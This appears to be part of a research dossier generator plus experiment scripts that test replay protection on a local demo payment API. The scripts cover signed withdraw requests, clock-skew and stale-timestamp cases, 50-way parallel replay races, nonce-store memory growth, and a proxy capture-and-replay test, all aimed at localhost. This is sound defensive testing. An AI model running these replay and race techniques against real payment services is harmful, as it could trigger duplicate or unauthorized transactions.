    add(`### ${result.label}`, '', `- Mode: ${result.mode}; requests: ${result.requestCount}.`, `- NONCE_TTL: ${result.nonceTtlSeconds} seconds; duration: ${result.durationSeconds} seconds (${result.durationVsTtl} of TTL).`, `- Empty namespace memory baseline: ${result.baselineUsedMemoryBytes} bytes.`, `- Baseline-subtracted slope at 100,000 keys: ${result.baselineSubtractedSlopeBytesPerKey} bytes/key.`, `- Request timings: ${code}corrections/${result.requestRowsCsv}${code}.`, '');
    for (const snapshot of result.snapshots) add(`- ${snapshot.measuredKeys} keys: ${snapshot.usedMemoryBytes} bytes; delta ${snapshot.deltaBytes}; baseline-subtracted ${snapshot.bytesPerKeyAboveBaseline ?? 'n/a'} bytes/key; elapsed ${snapshot.elapsedSeconds ?? 0} seconds.`);
    add('');
  }
  const racePath = path.join(correctionArtifacts, 'race-summary-1000-batches.json');
  if (fs.existsSync(racePath)) {
    const race = JSON.parse(fs.readFileSync(racePath, 'utf8'));
    add('### Race repeatability', '', `- ${race.identicalPayloadRace.totalRequests} identical replay requests over ${race.identicalPayloadRace.batches} batches of ${race.identicalPayloadRace.parallelWidth}; accepted-count distribution: ${JSON.stringify(race.identicalPayloadRace.acceptedCountDistribution)}.`, `- Secret-holder same-request-ID race: ${race.secretHolderSameRequestIdRace.parallelWidth} different signed payloads; ${race.secretHolderSameRequestIdRace.acceptedCount} accepted; debit ${race.secretHolderSameRequestIdRace.debitAmount}; oracle ${JSON.stringify(race.secretHolderSameRequestIdRace.oracle)}.`, '');
  }
  const boundaryPath = path.join(correctionArtifacts, 'timestamp-boundaries-30-each.json');
  if (fs.existsSync(boundaryPath)) {
    const boundary = JSON.parse(fs.readFileSync(boundaryPath, 'utf8'));
    add('### Clock boundary repetitions', '', `- Repetitions per edge/case: ${boundary.repetitionsPerCase}.`, `- First rejected past age: ${boundary.firstRejectedPastAgeSeconds}s; first rejected future offset: +${boundary.firstRejectedFutureOffsetSeconds}s.`, `- Raw per-request timing CSV: ${code}corrections/timestamp-boundaries-30-each.csv${code}.`, '');
  }
  const clockOffsetsPath = path.join(correctionArtifacts, 'clock-offsets-30-each.json');
  if (fs.existsSync(clockOffsetsPath)) {
    const clockOffsets = JSON.parse(fs.readFileSync(clockOffsetsPath, 'utf8'));
    add('### Repeated Phase 0 client clock offsets', '', `- Repetitions per offset: ${clockOffsets.repetitionsPerOffset}; all rows record request start/end/duration.`, `- Outcomes: ${clockOffsets.cases.map((item) => `${item.label} ${item.offsetMs}ms => ${item.expected} (${item.measuredCount}/${clockOffsets.repetitionsPerOffset})`).join('; ')}.`, `- Raw per-request timing CSV: ${code}corrections/clock-offsets-30-each.csv${code}.`, '');
  }
  const vizPath = path.join(correctionArtifacts, 'viz-enabled-nonce-scan-summary.json');
  if (fs.existsSync(vizPath)) {
    const viz = JSON.parse(fs.readFileSync(vizPath, 'utf8'));
    add('### Dashboard scan overhead', '', '- Measured once with VIZ_ENABLED=true. This is an implementation artifact of demo key scanning, not a defense property.', `- Samples: ${viz.nonceKeySamples.map((sample) => `${sample.nonceKeysAtDashboardScan} keys: ${sample.duration_ms} ms`).join('; ')}.`, '');
  }
}

add('', '## Complete file contents', '', 'Source code is included in full. Small result files are included in full. For any result over 200 KB or 1,000 rows, only the first 20 rows, last 20 rows, and aggregate statistics are included; the full result stays on disk. Signature values are redacted in this dossier.', '');

for (const absolutePath of allFiles) {
  const rel = relativePath(absolutePath);
  const stat = fs.statSync(absolutePath);
  add(`### ${code}${rel}${code}`, '', `Bytes: ${stat.size}. SHA-256: ${code}${manifestHashes.get(rel) || sha256(absolutePath)}${code}.`, '');
  if (stat.size === 0) {
    add('_Empty file (0 bytes)._','');
    continue;
  }
  let text = fs.readFileSync(absolutePath, 'utf8');
  text = redactAuthenticationArtifacts(rel, text);
  const rows = text.replace(/\r\n/g, '\n').split('\n');
  if (rows.at(-1) === '') rows.pop();
  const isResult = absolutePath.startsWith(`${resultRoot}${path.sep}`) && rel !== 'experiments/results/SHA256SUMS.json';
  if (isResult && (stat.size > 200 * 1024 || rows.length > 1000)) {
    const summary = largeFileSummary(absolutePath, text, rows);
    const excerpt = [...summary.first20, '... omitted rows ...', ...summary.last20].join('\n');
    add('Large-result rule applied. The complete result remains on disk.', '', `Total rows: ${summary.totalRows}.`, '', 'Aggregate statistics (counts, min, max, mean, p50, p95, and p99 for numeric columns):', '', `${code.repeat(3)}json`, JSON.stringify(summary.aggregates, null, 2), code.repeat(3), '', `${code.repeat(3)}${languageFor(rel)}`, excerpt, code.repeat(3), '');
    continue;
  }
  const fence = fenceFor(text);
  add(`${fence}${languageFor(rel)}`, text.endsWith('\n') ? text.slice(0, -1) : text, fence, '');
}

function readLog(name) {
  return fs.readFileSync(path.join(resultRoot, 'baseline', name), 'utf8');
}

fs.writeFileSync(outputPath, `${lines.join('\n')}\n`, 'utf8');
process.stdout.write(`Wrote ${relativePath(outputPath)} with ${allFiles.length} experiment files.\n`);
````

## experiments/results/baseline/check-ports-postrotation.js

````js
const net=require("net"),fs=require("fs"),path=require("path");
const ports=[3000,3001,6379];
Promise.all(ports.map(port=>new Promise(resolve=>{const s=net.createConnection({host:"127.0.0.1",port});s.once("connect",()=>{s.destroy();resolve({port,reachable:true})});s.once("error",e=>resolve({port,reachable:false,error:e.message}))}))).then(results=>{const out=path.resolve(process.cwd(),"../experiments/results/baseline/postrotation-port-check.json");fs.writeFileSync(out,JSON.stringify({checkedAt:new Date().toISOString(),results},null,2)+"\n");console.log(JSON.stringify(results))});
````

## experiments/results/baseline/collect-environment.js

````js
const fs = require("fs");
const os = require("os");
const path = require("path");
const net = require("net");
const { execFileSync } = require("child_process");
require(path.join(process.cwd(), "node_modules/dotenv")).config({ path: path.join(process.cwd(), ".env") });
const outDir = path.resolve(process.cwd(), "../experiments/results");
const cli = "C:/Applications/memurai-cli.exe";
const info = execFileSync(cli, ["INFO", "server"], { encoding: "utf8" });
const mem = execFileSync(cli, ["INFO", "memory"], { encoding: "utf8" });
const scan = execFileSync(cli, ["--scan", "--pattern", "used_nonce:*"], { encoding: "utf8", maxBuffer: 16 * 1024 * 1024 });
const parse = text => Object.fromEntries(text.split(/\r?\n/).filter(line => line && !line.startsWith("#") && line.includes(":" )).map(line => { const i=line.indexOf(":"); return [line.slice(0,i),line.slice(i+1)]; }));
const probe = port => new Promise(resolve => { const socket = net.createConnection({ host: "127.0.0.1", port }); socket.once("connect", () => { socket.destroy(); resolve(true); }); socket.once("error", () => resolve(false)); });
(async () => {
  const dbVersion = await new Promise((resolve, reject) => { const sqlite3 = require(path.join(process.cwd(), "node_modules/sqlite3")); const db = new sqlite3.Database(":memory:", error => { if (error) return reject(error); db.get("SELECT sqlite_version() AS version", (queryError,row) => { db.close(); queryError ? reject(queryError) : resolve(row.version); }); }); });
  const ports = { "3000": await probe(3000), "3001": await probe(3001), "6379": await probe(6379) };
  const redis = parse(info), memory = parse(mem);
  const result = {
    capturedAt: new Date().toISOString(),
    host: { os: `${os.platform()} ${os.release()}`, osVersion: os.version(), cpuModel: os.cpus()[0]?.model || "unknown", logicalCpuCount: os.cpus().length, totalRamBytes: os.totalmem(), totalRamGiB: Number((os.totalmem()/1024**3).toFixed(2)) },
    runtime: { node: process.version, sqlite3NodePackage: require(path.join(process.cwd(), "node_modules/sqlite3/package.json")).version, sqliteLibrary: dbVersion },
    nonceBackend: { product: "Memurai Developer (not stock Redis)", memuraiVersion: redis.memurai_version, edition: redis.memurai_edition, redisProtocolVersion: redis.redis_version, bind: redis.listener0, usedNonceKeys: scan.split(/\r?\n/).filter(Boolean).length, usedMemoryBytes: Number(memory.used_memory), usedMemoryHuman: memory.used_memory_human },
    portsReachableFromNativeNode: ports,
    apiHealth: await (async()=>{ try { const start=process.hrtime.bigint(); const response=await fetch("http://127.0.0.1:3000/api/health"); const body=await response.text(); const end=process.hrtime.bigint(); return { status: response.status, body, started_ns:start.toString(), ended_ns:end.toString(), duration_ns:(end-start).toString() }; } catch(error) { return { error: error.message }; } })(),
    redisUrl: process.env.REDIS_URL
  };
  fs.writeFileSync(path.join(outDir, "environment.json"), JSON.stringify(result, null, 2)+"\n");
  fs.writeFileSync(path.join(outDir, "baseline/nonce-growth-measured.json"), JSON.stringify({ capturedAt: result.capturedAt, usedNonceKeys: result.nonceBackend.usedNonceKeys, usedMemoryBytes: result.nonceBackend.usedMemoryBytes, usedMemoryHuman: result.nonceBackend.usedMemoryHuman, memuraiVersion: result.nonceBackend.memuraiVersion, nonceTtlSeconds: 300, requestsWithUniqueNonces: 10000 }, null, 2)+"\n");
  console.log(JSON.stringify(result, null, 2));
})().catch(error => { console.error(error.stack || error.message); process.exitCode = 1; });
````

## experiments/results/baseline/make-stale-payload.js

````js
const path = require("path");
require(path.join(process.cwd(), "node_modules/dotenv")).config({ path: path.join(process.cwd(), ".env") });
const { generateSignature } = require(path.join(process.cwd(), "utils/hmac"));
const crypto = require("crypto");
const payload = { method: "POST", path: "/api/withdraw", user_id: "anis_101", account_id: "acc_777", amount: 1000, currency: "BDT", timestamp: new Date(Date.now() - 301000).toISOString(), nonce: crypto.randomUUID(), request_id: crypto.randomUUID() };
payload.signature = generateSignature(payload, process.env.HMAC_SECRET);
require("fs").writeFileSync(path.resolve(process.cwd(), "../experiments/results/baseline/stale-payload.json"), JSON.stringify(payload, null, 2) + "\n");
````

## experiments/results/baseline/make-tamper-source.js

````js
const fs = require("fs"), path = require("path"), crypto = require("crypto");
require(path.join(process.cwd(), "node_modules/dotenv")).config({path:path.join(process.cwd(), ".env")});
const {generateSignature}=require(path.join(process.cwd(), "utils/hmac"));
const payload={method:"POST",path:"/api/withdraw",user_id:"anis_101",account_id:"acc_777",amount:1000,currency:"BDT",timestamp:new Date().toISOString(),nonce:crypto.randomUUID(),request_id:crypto.randomUUID()};
payload.signature=generateSignature(payload,process.env.HMAC_SECRET);
fs.writeFileSync(path.resolve(process.cwd(),"../experiments/results/baseline/tamper-source.json"),JSON.stringify(payload,null,2)+"\n");
````

## experiments/results/baseline/run-measured-cases.js

````js
const fs = require("fs");
const path = require("path");
require(path.join(process.cwd(), "node_modules/dotenv")).config({ path: path.join(process.cwd(), ".env") });
const crypto = require("crypto");
const { generateSignature } = require(path.join(process.cwd(), "utils/hmac"));
const outDir = path.resolve(process.cwd(), "../experiments/results/baseline");
const base = () => ({ method: "POST", path: "/api/withdraw", user_id: "anis_101", account_id: "acc_777", amount: 1, currency: "BDT", timestamp: new Date().toISOString(), nonce: crypto.randomUUID(), request_id: crypto.randomUUID() });
const sign = payload => { payload.signature = generateSignature(payload, process.env.HMAC_SECRET); return payload; };
const post = async payload => { const start = process.hrtime.bigint(); const response = await fetch("http://127.0.0.1:3000/api/withdraw", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(payload) }); const body = await response.json(); const end = process.hrtime.bigint(); return { started_ns: start.toString(), ended_ns: end.toString(), duration_ns: (end-start).toString(), httpStatus: response.status, ...body }; };
const key = result => result.status === "ACCEPTED" ? "ACCEPTED" : (result.reason || result.error || "UNKNOWN");
(async () => {
  const parallelPayload = sign(base());
  const parallel = await Promise.all(Array.from({ length: 50 }, () => post(parallelPayload)));
  const parallelCounts = parallel.reduce((acc, result) => { const k = key(result); acc[k] = (acc[k] || 0) + 1; return acc; }, {});
  fs.writeFileSync(path.join(outDir, "parallel-50-responses.json"), JSON.stringify(parallel, null, 2) + "\n");
  const changedIdPayload = sign(base());
  changedIdPayload.request_id = crypto.randomUUID();
  const changedId = await post(changedIdPayload);
  const skew = [];
  for (const [label, offsetMs] of [["-10m", -600000], ["-1m", -60000], ["+10s", 10000], ["+1m", 60000], ["+10m", 600000]]) {
    const payload = sign(base());
    payload.timestamp = new Date(Date.now() + offsetMs).toISOString();
    payload.signature = generateSignature(payload, process.env.HMAC_SECRET);
    skew.push({ label, offsetMs, result: await post(payload) });
  }
  const resetStart = process.hrtime.bigint();
  const resetResponse = await fetch("http://127.0.0.1:3000/api/reset", { method: "POST" });
  const resetEnd = process.hrtime.bigint();
  const resetTiming = { started_ns: resetStart.toString(), ended_ns: resetEnd.toString(), duration_ns: (resetEnd-resetStart).toString(), httpStatus: resetResponse.status };
  const seed = sign(base());
  const seedResult = await post(seed);
  const crashStart = process.hrtime.bigint();
  const crashResponse = await fetch("http://127.0.0.1:3000/api/demo/nonce-crash", { method: "POST" });
  const nonceCrash = await crashResponse.json();
  const crashEnd = process.hrtime.bigint();
  nonceCrash.timing = { started_ns: crashStart.toString(), ended_ns: crashEnd.toString(), duration_ns: (crashEnd-crashStart).toString(), httpStatus: crashResponse.status };
  const duplicateId = seed.request_id;
  const rows = ["index,started_ns,ended_ns,duration_ns,httpStatus,status,reason"];
  const counts = {};
  for (let i = 1; i <= 10000; i++) {
    const payload = sign({ ...base(), request_id: duplicateId });
    const result = await post(payload);
    const k = key(result); counts[k] = (counts[k] || 0) + 1;
    rows.push([i, result.started_ns, result.ended_ns, result.duration_ns, result.httpStatus, result.status || "", result.reason || ""].join(","));
  }
  fs.writeFileSync(path.join(outDir, "unique-nonce-10000-responses.csv"), rows.join("\n") + "\n");
  const result = { parallel50: { total: parallel.length, counts: parallelCounts, perRequestTiming: parallel.map(({ started_ns, ended_ns, duration_ns }) => ({ started_ns, ended_ns, duration_ns })) }, changedRequestIdWithOldSignature: changedId, clockSkew: skew, controlRequests: { reset: resetTiming }, nonceGrowth: { resetPerformed: true, seedResult, nonceStoreClearedBeforeLoop: nonceCrash, requests: 10000, uniqueNonces: 10000, reusedRequestId: duplicateId, responseCounts: counts } };
  fs.writeFileSync(path.join(outDir, "measured-cases.json"), JSON.stringify(result, null, 2) + "\n");
  console.log(JSON.stringify(result, null, 2));
})().catch(error => { console.error(error.stack || error.message); process.exitCode = 1; });
````

## experiments/results/baseline/trigger-capture.js

````js
const fs = require("fs");
const path = require("path");
require(path.join(process.cwd(), "node_modules/dotenv")).config({ path: path.join(process.cwd(), ".env") });
const crypto = require("crypto");
const { generateSignature } = require(path.join(process.cwd(), "utils/hmac"));
const payload = { method: "POST", path: "/api/withdraw", user_id: "anis_101", account_id: "acc_777", amount: 1000, currency: "BDT", timestamp: new Date().toISOString(), nonce: crypto.randomUUID(), request_id: crypto.randomUUID() };
payload.signature = generateSignature(payload, process.env.HMAC_SECRET);
const started = process.hrtime.bigint();
fetch("http://127.0.0.1:3000/api/withdraw", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(payload) }).then(async response => {
  const body = await response.json();
  const ended = process.hrtime.bigint();
  const result = { started_ns: started.toString(), ended_ns: ended.toString(), duration_ns: (ended-started).toString(), httpStatus: response.status, body };
  fs.writeFileSync(path.resolve(process.cwd(), "../experiments/results/baseline/immediate-replay-trigger.json"), JSON.stringify(result, null, 2) + "\n");
  console.log(JSON.stringify(result));
}).catch(error => { console.error(error.message); process.exitCode = 1; });
````

## experiments/run-nonce-memory.js

````js
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { execFileSync } = require('child_process');
require('../server/node_modules/dotenv').config({ path: path.resolve(__dirname, '../server/.env') });
const { generateSignature } = require('../server/utils/hmac');
const { timedRequest } = require('./lib/http');

const mode = process.argv[2];
if (!['accepted', 'requestid'].includes(mode)) throw new Error('Usage: node experiments/run-nonce-memory.js accepted|requestid');
const baseUrl = process.env.EXPERIMENT_API || 'http://127.0.0.1:3000';
const runId = process.env.RUN_ID || `${mode}-${Date.now()}`;
const ttlSeconds = Number(process.env.NONCE_TTL || 86400);
const points = (process.env.MEMORY_POINTS || '0,1000,10000,100000').split(',').map(Number);
const output = path.join(__dirname, 'results', 'corrections');
const cli = process.env.MEMURAI_CLI || 'C:/Applications/memurai-cli.exe';
fs.mkdirSync(output, { recursive: true });

function parseInfo(text) {
  return Object.fromEntries(text.split(/\r?\n/).filter((line) => line && !line.startsWith('#') && line.includes(':')).map((line) => {
    const split = line.indexOf(':'); return [line.slice(0, split), line.slice(split + 1)];
  }));
}

function memoryBytes(label, rawInfoPath) {
  const raw = execFileSync(cli, ['INFO', 'memory'], { encoding: 'utf8' });
  fs.appendFileSync(rawInfoPath, `\n[${new Date().toISOString()}] ${label}\n${raw}\n`);
  const info = parseInfo(raw);
  return Number(info.used_memory);
}

function namespaceKeyCount(namespace) {
  const scan = execFileSync(cli, ['--scan', '--pattern', `used_nonce:${namespace}:*`], { encoding: 'utf8', maxBuffer: 32 * 1024 * 1024 });
  return scan.split(/\r?\n/).filter(Boolean).length;
}

function signedPayload(requestId) {
  const payload = {
    method: 'POST', path: '/api/deposit', user_id: 'anis_101', account_id: 'acc_777',
    amount: 1, currency: 'BDT', timestamp: new Date().toISOString(),
    nonce: `nonce_${crypto.randomUUID()}`, request_id: requestId
  };
  payload.signature = generateSignature(payload, process.env.HMAC_SECRET);
  return payload;
}

async function post(payload, runRows, index) {
  const result = await timedRequest(`${baseUrl}/api/deposit`, {
    method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(payload)
  });
  runRows.push({ index, ...result });
  if (mode === 'accepted' && result.body.status !== 'ACCEPTED') throw new Error(`Request ${index} rejected: ${JSON.stringify(result.body)}`);
  if (mode === 'requestid' && index !== 'seed' && result.body.reason !== 'ALREADY_PROCESSED') throw new Error(`Request ${index} did not reach request-ID check: ${JSON.stringify(result.body)}`);
  return result;
}

async function main() {
  const namespace = process.env.NONCE_KEY_NAMESPACE;
  if (!namespace) throw new Error('Set NONCE_KEY_NAMESPACE before starting the server and harness');
  const controlRows = [];
  const reset = await timedRequest(`${baseUrl}/api/reset`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{}' });
  controlRows.push({ name: 'reset', ...reset });
  let duplicateRequestId = null;
  if (mode === 'requestid') {
    duplicateRequestId = `seed_${runId}`;
    const seed = await post(signedPayload(duplicateRequestId), [], 'seed');
    controlRows.push({ name: 'seed', ...seed });
    const clear = await timedRequest(`${baseUrl}/api/demo/nonce-crash`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{}' });
    controlRows.push({ name: 'nonce-store-clear', ...clear });
  }

  const rawInfoPath = path.join(output, `nonce-memory-${mode}-${runId}-raw-info.log`);
  fs.writeFileSync(rawInfoPath, '');
  const baselineMemory = memoryBytes('baseline-empty-store', rawInfoPath);
  const baselineKeys = namespaceKeyCount(namespace);
  if (baselineKeys !== 0) throw new Error(`Expected an empty run namespace, found ${baselineKeys} keys`);
  const snapshots = [{ targetKeys: 0, measuredKeys: 0, usedMemoryBytes: baselineMemory, baselineUsedMemoryBytes: baselineMemory, deltaBytes: 0, bytesPerKeyAboveBaseline: null, elapsed_ns: '0', ttlSeconds }];
  const csvPath = path.join(output, `nonce-memory-${mode}-${runId}-requests.csv`);
  const rows = ['index,started_ns,ended_ns,duration_ns,http_status,outcome'];
  const requestRows = [];
  const runStart = process.hrtime.bigint();
  let sent = 0;
  for (const target of points.slice(1)) {
    while (sent < target) {
      sent += 1;
      const id = mode === 'requestid' ? duplicateRequestId : `accepted_${runId}_${sent}`;
      await post(signedPayload(id), requestRows, sent);
    }
    const elapsed = process.hrtime.bigint() - runStart;
    const actualKeys = namespaceKeyCount(namespace);
    const usedMemory = memoryBytes(`${target}-keys`, rawInfoPath);
    if (actualKeys !== target) throw new Error(`Expected ${target} live nonce keys, found ${actualKeys}`);
    if (Number(elapsed) / 1e9 >= ttlSeconds) throw new Error(`Run exceeded NONCE_TTL before snapshot ${target}`);
    snapshots.push({ targetKeys: target, measuredKeys: actualKeys, usedMemoryBytes: usedMemory, baselineUsedMemoryBytes: baselineMemory,
      deltaBytes: usedMemory - baselineMemory, bytesPerKeyAboveBaseline: (usedMemory - baselineMemory) / actualKeys,
      elapsed_ns: elapsed.toString(), elapsedSeconds: Number(elapsed) / 1e9, ttlSeconds, ttlFractionUsed: Number(elapsed) / 1e9 / ttlSeconds });
  }
  const runEnd = process.hrtime.bigint();
  for (const row of requestRows) rows.push([row.index, row.start_ns, row.end_ns, row.duration_ns, row.status, row.body.reason || row.body.status || ''].join(','));
  fs.writeFileSync(csvPath, `${rows.join('\n')}\n`);
  fs.writeFileSync(path.join(output, `nonce-memory-${mode}-${runId}-control.csv`), [
    'name,started_ns,ended_ns,duration_ns,http_status,outcome',
    ...controlRows.map((row) => [row.name, row.start_ns, row.end_ns, row.duration_ns, row.status, row.body.status || row.body.ok || ''].join(','))
  ].join('\n') + '\n');
  const summary = {
    runId, mode, nonceBackend: process.env.NONCE_STORE || 'redis', vizEnabled: process.env.VIZ_ENABLED === 'true', label: mode === 'requestid' ? 'nonce-store growth from requests rejected at the request-ID check' : 'nonce-store growth from accepted requests',
    createdAt: new Date().toISOString(), nonceTtlSeconds: ttlSeconds, duration_ns: (runEnd - runStart).toString(),
    durationSeconds: Number(runEnd - runStart) / 1e9, durationVsTtl: Number(runEnd - runStart) / 1e9 / ttlSeconds,
    baselineUsedMemoryBytes: baselineMemory, baselineNonceKeys: baselineKeys, snapshots,
    baselineSubtractedSlopeBytesPerKey: (snapshots.at(-1).usedMemoryBytes - baselineMemory) / 100000,
    requestRowsCsv: path.basename(csvPath), controlRowsCsv: `nonce-memory-${mode}-${runId}-control.csv`, rawInfoLog: path.basename(rawInfoPath), requestCount: sent
  };
  fs.writeFileSync(path.join(output, `nonce-memory-${mode}-${runId}-summary.json`), `${JSON.stringify(summary, null, 2)}\n`);
  process.stdout.write(`${JSON.stringify(summary, null, 2)}\n`);
}

main().catch((error) => { process.stderr.write(`${error.stack || error.message}\n`); process.exitCode = 1; });
````

## experiments/run-races.js

````js
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
require('../server/node_modules/dotenv').config({ path: path.resolve(__dirname, '../server/.env') });
const { generateSignature } = require('../server/utils/hmac');
const { computeMoneyIntegrity } = require('../server/utils/money-oracle');
const { timedRequest } = require('./lib/http');

const baseUrl = process.env.EXPERIMENT_API || 'http://127.0.0.1:3000';
const output = path.join(__dirname, 'results', 'corrections');
const batches = Number(process.env.RACE_BATCHES || 1000);
const width = 50;
fs.mkdirSync(output, { recursive: true });

function makePayload(requestId = `request_${crypto.randomUUID()}`, nonce = `nonce_${crypto.randomUUID()}`) {
  const payload = { method: 'POST', path: '/api/withdraw', user_id: 'anis_101', account_id: 'acc_777', amount: 1,
    currency: 'BDT', timestamp: new Date().toISOString(), nonce, request_id: requestId };
  payload.signature = generateSignature(payload, process.env.HMAC_SECRET);
  return payload;
}

async function request(payload) {
  return timedRequest(`${baseUrl}/api/withdraw`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(payload) });
}

function writeRows(filename, header, rows) {
  fs.writeFileSync(path.join(output, filename), `${[header, ...rows].join('\n')}\n`);
}

async function main() {
  const perRequestRows = [];
  const batchRows = [];
  const acceptedDistribution = {};
  for (let batch = 1; batch <= batches; batch += 1) {
    const reset = await timedRequest(`${baseUrl}/api/reset`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{}' });
    if (reset.status !== 200) throw new Error(`Reset failed before batch ${batch}`);
    const payload = makePayload();
    const start = process.hrtime.bigint();
    const responses = await Promise.all(Array.from({ length: width }, () => request(payload)));
    const end = process.hrtime.bigint();
    const accepted = responses.filter((response) => response.body.status === 'ACCEPTED').length;
    const reasons = responses.reduce((map, response) => {
      const reason = response.body.reason || response.body.status || 'UNKNOWN'; map[reason] = (map[reason] || 0) + 1; return map;
    }, {});
    acceptedDistribution[accepted] = (acceptedDistribution[accepted] || 0) + 1;
    batchRows.push([batch, accepted, reasons.NONCE_FAIL || 0, (end - start).toString(), reset.start_ns, reset.end_ns, reset.duration_ns].join(','));
    responses.forEach((response, index) => perRequestRows.push([batch, index + 1, response.start_ns, response.end_ns, response.duration_ns, response.status, response.body.reason || response.body.status || ''].join(',')));
    if (accepted !== 1) throw new Error(`Batch ${batch}: expected one acceptance, got ${accepted}`);
  }
  writeRows(`race-identical-50x${batches}-requests.csv`, 'batch,request_index,started_ns,ended_ns,duration_ns,http_status,outcome', perRequestRows);
  writeRows(`race-identical-50x${batches}-batches.csv`, 'batch,accepted_count,nonce_fail_count,batch_duration_ns,reset_started_ns,reset_ended_ns,reset_duration_ns', batchRows);

  await timedRequest(`${baseUrl}/api/reset`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{}' });
  const sharedRequestId = `secret-holder-${crypto.randomUUID()}`;
  const payloads = Array.from({ length: width }, (_, index) => makePayload(sharedRequestId, `secret-holder-nonce-${index}-${crypto.randomUUID()}`));
  const before = await timedRequest(`${baseUrl}/api/balance/anis_101`);
  const raceStart = process.hrtime.bigint();
  const race = await Promise.all(payloads.map(request));
  const raceEnd = process.hrtime.bigint();
  const after = await timedRequest(`${baseUrl}/api/balance/anis_101`);
  const transactions = race.map((result, index) => result.body.status === 'ACCEPTED' ? ({
    type: 'WITHDRAW', status: 'SUCCESS', amount: 1, signature: payloads[index].signature
  }) : null).filter(Boolean);
  const oracle = computeMoneyIntegrity(transactions, payloads);
  const summary = {
    vizEnabled: process.env.VIZ_ENABLED === 'true',
    identicalPayloadRace: { batches, parallelWidth: width, acceptedCountDistribution: acceptedDistribution, acceptedPerBatch: 1, totalRequests: batches * width },
    secretHolderSameRequestIdRace: {
      parallelWidth: width, acceptedCount: race.filter((result) => result.body.status === 'ACCEPTED').length,
      requestIdShared: true, distinctValidNonces: width, debitAmount: Number(before.body.balance) - Number(after.body.balance),
      duration_ns: (raceEnd - raceStart).toString(), beforeBalanceTiming: before, afterBalanceTiming: after, oracle
    }
  };
  const sameIdRows = race.map((result, index) => [index + 1, result.start_ns, result.end_ns, result.duration_ns, result.status, result.body.reason || result.body.status || ''].join(','));
  writeRows('race-same-request-id-50-requests.csv', 'request_index,started_ns,ended_ns,duration_ns,http_status,outcome', sameIdRows);
  fs.writeFileSync(path.join(output, `race-summary-${batches}-batches.json`), `${JSON.stringify(summary, null, 2)}\n`);
  process.stdout.write(`${JSON.stringify(summary, null, 2)}\n`);
}

main().catch((error) => { process.stderr.write(`${error.stack || error.message}\n`); process.exitCode = 1; });
````

## experiments/run-viz-curve.js

````js
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
require('../server/node_modules/dotenv').config({ path: path.resolve(__dirname, '../server/.env') });
const { generateSignature } = require('../server/utils/hmac');
const { timedRequest } = require('./lib/http');

const baseUrl = process.env.EXPERIMENT_API || 'http://127.0.0.1:3000';
const output = path.join(__dirname, 'results', 'corrections');
const sampleCounts = new Set([1, 100, 1000, 5000]);
const maximum = 5000;
fs.mkdirSync(output, { recursive: true });

function makePayload(index) {
  const payload = { method: 'POST', path: '/api/deposit', user_id: 'anis_101', account_id: 'acc_777', amount: 1,
    currency: 'BDT', timestamp: new Date().toISOString(), nonce: `viz-${index}-${crypto.randomUUID()}`, request_id: `viz-${index}-${crypto.randomUUID()}` };
  payload.signature = generateSignature(payload, process.env.HMAC_SECRET);
  return payload;
}

async function main() {
  if (process.env.VIZ_ENABLED !== 'true') throw new Error('Start the measured server with VIZ_ENABLED=true');
  const reset = await timedRequest(`${baseUrl}/api/reset`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{}' });
  const requestRows = ['index,nonce_keys_at_dashboard_scan,started_ns,ended_ns,duration_ns,http_status,outcome'];
  const samples = [];
  for (let index = 0; index < maximum; index += 1) {
    const result = await timedRequest(`${baseUrl}/api/deposit`, {
      method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(makePayload(index))
    });
    if (result.body.status !== 'ACCEPTED') throw new Error(`Visualization curve request ${index} failed: ${JSON.stringify(result.body)}`);
    requestRows.push([index + 1, index + 1, result.start_ns, result.end_ns, result.duration_ns, result.status, result.body.status].join(','));
    if (sampleCounts.has(index + 1)) samples.push({ nonceKeysAtDashboardScan: index + 1, duration_ns: result.duration_ns, duration_ms: Number(result.duration_ns) / 1e6, httpStatus: result.status });
  }
  fs.writeFileSync(path.join(output, 'viz-enabled-nonce-scan-requests.csv'), `${requestRows.join('\n')}\n`);
  const summary = { measuredOnce: true, vizEnabled: true, resetTiming: reset, label: 'dashboard per-request key-scan implementation artifact, not a defense property', nonceKeySamples: samples, allRequests: maximum };
  fs.writeFileSync(path.join(output, 'viz-enabled-nonce-scan-summary.json'), `${JSON.stringify(summary, null, 2)}\n`);
  process.stdout.write(`${JSON.stringify(summary, null, 2)}\n`);
}
main().catch((error) => { process.stderr.write(`${error.stack || error.message}\n`); process.exitCode = 1; });
````

## experiments/send-through-proxy.js

````js
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
require('../server/node_modules/dotenv').config({ path: path.resolve(__dirname, '../server/.env') });
const { generateSignature } = require('../server/utils/hmac');
const { timedRequest } = require('./lib/http');

const proxyUrl = process.env.PROXY_URL || 'http://127.0.0.1:3002';
const serverUrl = process.env.EXPERIMENT_API || 'http://127.0.0.1:3000';
const capturePath = process.env.PROXY_CAPTURE_FILE;
if (!capturePath) throw new Error('Set PROXY_CAPTURE_FILE to a private file outside the repository');

async function main() {
  const payload = {
    method: 'POST', path: '/api/withdraw', user_id: 'anis_101', account_id: 'acc_777', amount: 1,
    currency: 'BDT', timestamp: new Date().toISOString(), nonce: `proxy-${crypto.randomUUID()}`, request_id: `proxy-${crypto.randomUUID()}`
  };
  payload.signature = generateSignature(payload, process.env.HMAC_SECRET);
  const body = JSON.stringify(payload);
  const original = await timedRequest(`${proxyUrl}/api/withdraw`, {
    method: 'POST', headers: { 'content-type': 'application/json' }, body
  });
  const capture = JSON.parse(fs.readFileSync(capturePath, 'utf8'));
  if (capture.request.body !== body) throw new Error('Proxy did not record the exact forwarded body');
  const headers = { ...capture.request.headers };
  delete headers.host;
  delete headers['content-length'];
  delete headers.connection;
  const replay = await timedRequest(`${serverUrl}${capture.request.path}`, {
    method: capture.request.method, headers, body: capture.request.body
  });
